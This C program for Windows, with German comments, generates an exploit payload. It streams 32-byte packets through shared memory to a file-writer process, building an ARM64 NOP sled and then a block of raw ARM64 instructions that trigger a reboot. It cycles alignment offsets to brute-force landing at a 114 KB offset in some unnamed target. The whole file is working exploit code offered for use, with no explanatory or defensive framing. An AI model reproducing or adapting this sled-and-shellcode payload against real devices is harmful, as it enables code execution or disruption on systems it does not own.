#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

#define BLOCK_SIZE 32
#define SHM_SIZE 33
#define SHM_NAME "Local\\MyCustomProtocol"
#define MUTEX_NAME "Local\\MyProtocolMutex"
#define TARGET_SIZE_KB 114 // Dein Hotspot
#define MAX_TICKS ((TARGET_SIZE_KB * 1024) / BLOCK_SIZE)

int main(int argc, char *argv[]) {
    HANDLE hMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, SHM_SIZE, SHM_NAME);
    unsigned char* shm_buffer = (unsigned char*) MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, SHM_SIZE);
    HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);

    if (!shm_buffer || !hMutex) { printf("[ ERROR ] SHM Fehler!\n"); return 1; }

    unsigned int tick = 0;
    unsigned char local_packet[BLOCK_SIZE];
    unsigned int nop = 0xd503201f;
    unsigned int reboot_cmd[] = { 0x20202020, 0xd280ed00, 0xf2a70000, 0x52800101, 0xb9000001 };

    printf("[ SYSTEM ] Starte Omni-Reboot (Alignment Brute-Force)...\n");
    shm_buffer[0] = 0x00; 

    while (tick < MAX_TICKS) {
        WaitForSingleObject(hMutex, INFINITE);
        if (shm_buffer[0] != 0x00) { ReleaseMutex(hMutex); Sleep(1); continue; }

        memset(local_packet, 0, BLOCK_SIZE);
        int current_offset = 0; // Für das Log unten deklariert

        if (tick == 0) {
            // HIER kannst du 0, 1, 2, oder 3 testen
            int entry_shift = 0; 
            unsigned int *p = (unsigned int*)(local_packet + entry_shift);
            for(int i = 0; i < (BLOCK_SIZE - entry_shift) / 4; i++) {
                p[i] = nop;
            }
        } 
        else {
            current_offset = (tick / 256) % 4; 

            // NOP Sled
            for (int i = 0; i < 7; i++) {
                int pos = current_offset + (i * 4);
                if (pos + 4 <= BLOCK_SIZE) {
                    memcpy(local_packet + pos, &nop, 4);
                }
            }

            // Reboot Landezone
            if (tick > MAX_TICKS - 400) {
                if (current_offset + 16 <= BLOCK_SIZE) memcpy(local_packet + current_offset, reboot_cmd, 16);
                if (current_offset + 32 <= BLOCK_SIZE) memcpy(local_packet + current_offset + 16, reboot_cmd, 16);
            }
        }

        memcpy(shm_buffer + 1, local_packet, BLOCK_SIZE);
        shm_buffer[0] = 0x2A; 
        ReleaseMutex(hMutex);
        
        if (tick % 1000 == 0) printf("Zone Offset %d | Tick %u\n", current_offset, tick);
        tick++;
    }

    // Abschluss-Handshake
    printf("[ SYSTEM ] Warte auf File-Writer...\n");
    while(1) {
        WaitForSingleObject(hMutex, INFINITE);
        if (shm_buffer[0] == 0x00) { 
            shm_buffer[0] = 0xFF; 
            ReleaseMutex(hMutex); 
            break; 
        }
        ReleaseMutex(hMutex);
        Sleep(1);
    }

    printf("[ DONE ] Payload bereit. Teste entry_shift 0-3 bei 114 KB!\n");
    return 0;
}